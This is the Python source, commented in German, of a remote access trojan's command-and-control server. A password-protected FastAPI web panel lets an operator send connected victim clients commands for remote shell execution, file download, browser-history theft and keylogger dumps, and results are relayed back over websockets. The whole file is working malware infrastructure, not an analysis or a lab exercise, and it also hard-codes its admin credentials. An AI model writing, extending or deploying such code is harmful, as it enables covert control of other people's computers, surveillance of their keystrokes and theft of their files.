import asyncio
import json
import base64
import os
from datetime import datetime
import secrets

import uvicorn
import websockets
from fastapi import (
    FastAPI,
    WebSocket,
    WebSocketDisconnect,
    Depends,
    HTTPException,
    status,
)
from fastapi.responses import FileResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials

# --- Globale Variablen & App-Initialisierung ---
RAT_CLIENTS = {}
CLIENT_COUNTER = 1
WEB_UI_SOCKET: WebSocket | None = None
app = FastAPI()

# --- Basic Auth Konfiguration ---
security = HTTPBasic()
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "supersecretpassword123"


# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN (unverändert) ---
async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(
        credentials.username, ADMIN_USERNAME
    )
    correct_password = secrets.compare_digest(
        credentials.password, ADMIN_PASSWORD
    )
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Falsche Anmeldeinformationen",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username


# --- NEUE AUTH-FUNKTION SPEZIELL FÜR WEBSOCKETS ---
async def get_current_user_ws(websocket: WebSocket):
    """
    Diese Funktion liest die Auth-Header manuell aus dem WebSocket-Scope.
    Sie wird als Abhängigkeit für den WebSocket-Endpunkt verwendet.
    """
    auth_header = websocket.headers.get("authorization")
    if not auth_header:
        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
        raise WebSocketDisconnect("Authorization header fehlt")

    try:
        scheme, credentials_b64 = auth_header.split()
        if scheme.lower() != "basic":
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            raise WebSocketDisconnect("Ungültiges Authentifizierungsschema")

        decoded_credentials = base64.b64decode(credentials_b64).decode("utf-8")
        username, password = decoded_credentials.split(":", 1)

        correct_username = secrets.compare_digest(username, ADMIN_USERNAME)
        correct_password = secrets.compare_digest(password, ADMIN_PASSWORD)

        if not (correct_username and correct_password):
            await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
            raise WebSocketDisconnect("Falsche Anmeldeinformationen")

    except Exception:
        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
        raise WebSocketDisconnect("Fehler bei der Authentifizierung")

    return username


# --- Web-UI Endpunkte (jetzt mit korrekten Dependencies) ---

@app.get("/", dependencies=[Depends(get_current_user)])
async def get_index():
    return FileResponse("index.html")


@app.websocket("/ws", dependencies=[Depends(get_current_user_ws)]) # KORRIGIERT
async def websocket_endpoint(websocket: WebSocket):
    global WEB_UI_SOCKET
    await websocket.accept()
    WEB_UI_SOCKET = websocket
    print("Web-UI verbunden und authentifiziert.")
    # ... (Rest der Funktion bleibt unverändert)
    await send_to_web_ui(
        {
            "type": "client_list",
            "clients": [
                {"id": cid, "address": ws.remote_address}
                for cid, ws in RAT_CLIENTS.items()
            ],
        }
    )
    try:
        while True:
            data = await websocket.receive_json()
            action = data.get("action")
            target_id = data.get("target_id")
            if not target_id or target_id not in RAT_CLIENTS:
                await send_to_web_ui(
                    {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
                )
                continue
            target_ws = RAT_CLIENTS[target_id]
            payload = {"action": action}
            if action == "exec":
                payload["command"] = data.get("command")
            elif action == "download":
                payload["path"] = data.get("path")
            elif action == "history":
                payload["limit"] = data.get("limit")
            elif action == "keylogger":
                payload["count"] = data.get("count")
            try:
                await target_ws.send(json.dumps(payload))
            except websockets.ConnectionClosed:
                await send_to_web_ui(
                    {"type": "error", "message": f"Verbindung zu Client {target_id} verloren."}
                )
    except WebSocketDisconnect:
        print("Web-UI hat die Verbindung getrennt.")
        WEB_UI_SOCKET = None


# --- RAT-Client Handler und Server-Lebenszyklus (unverändert) ---

async def send_to_web_ui(data: dict):
    if WEB_UI_SOCKET:
        try:
            await WEB_UI_SOCKET.send_json(data)
        except Exception:
            pass

async def rat_handler(websocket):
    global CLIENT_COUNTER
    client_id = CLIENT_COUNTER
    CLIENT_COUNTER += 1
    RAT_CLIENTS[client_id] = websocket
    print(f"[+] Neuer RAT-Client verbunden: ID {client_id} von {websocket.remote_address}")
    await send_to_web_ui(
        {
            "type": "client_connected",
            "client": {"id": client_id, "address": websocket.remote_address},
        }
    )
    try:
        async for message in websocket:
            response = json.loads(message)
            response["client_id"] = client_id
            await send_to_web_ui(response)
    except websockets.ConnectionClosed:
        print(f"[-] RAT-Client {client_id} hat die Verbindung getrennt.")
    finally:
        if client_id in RAT_CLIENTS:
            del RAT_CLIENTS[client_id]
            await send_to_web_ui({"type": "client_disconnected", "client_id": client_id})


async def start_rat_server():
    host = "0.0.0.0"
    port = 8765
    print(f"[*] RAT-Listener startet auf ws://{host}:{port}")
    async with websockets.serve(rat_handler, host, port):
        await asyncio.Future()


@app.on_event("startup")
async def on_startup():
    task = asyncio.create_task(start_rat_server())
    app.state.rat_server_task = task


@app.on_event("shutdown")
async def on_shutdown():
    print("Fahre Server herunter, beende RAT-Listener-Task...")
    app.state.rat_server_task.cancel()
    try:
        await app.state.rat_server_task
    except asyncio.CancelledError:
        print("RAT-Listener-Task erfolgreich beendet.")


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)